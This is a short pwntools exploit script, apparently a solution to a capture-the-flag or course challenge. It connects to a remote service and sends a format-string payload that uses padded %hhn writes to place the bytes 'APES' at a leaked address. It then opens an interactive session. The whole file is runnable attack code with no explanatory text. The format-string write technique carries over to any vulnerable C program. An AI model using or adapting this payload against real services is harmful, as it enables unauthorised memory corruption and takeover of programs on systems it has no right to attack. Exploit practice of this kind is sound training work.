from pwn import *

def get_n(new, prev, size):
	while new <= prev:
		new += (1 << size)
	return new-prev

p = remote('plsdonthaq.me', 4001)
#p = process('./door')

p.recvuntil('the way at ')
target_addr = int(p.recvline().rstrip(), 16)

payload = b'AAAAA'
payload += p32(target_addr)
payload += p32(target_addr + 1)
payload += p32(target_addr + 2)
payload += p32(target_addr + 3)

setup_len = len(payload)

n_val = [setup_len]
n_val += [get_n(u8('A'), sum(n_val[:1]), 8)]
n_val += [get_n(u8('P'), sum(n_val[:2]), 8)]
n_val += [get_n(u8('E'), sum(n_val[:3]), 8)]
n_val += [get_n(u8('S'), sum(n_val[:4]), 8)]

print(n_val)

payload += '%{}c'.format(n_val[1]).encode()
payload += b'%3$hhn'
payload += '%{}c'.format(n_val[2]).encode()
payload += b'%4$hhn'
payload += '%{}c'.format(n_val[3]).encode()
payload += b'%5$hhn'
payload += '%{}c'.format(n_val[4]).encode()
payload += b'%6$hhn'

p.sendline(payload)

p.interactive()
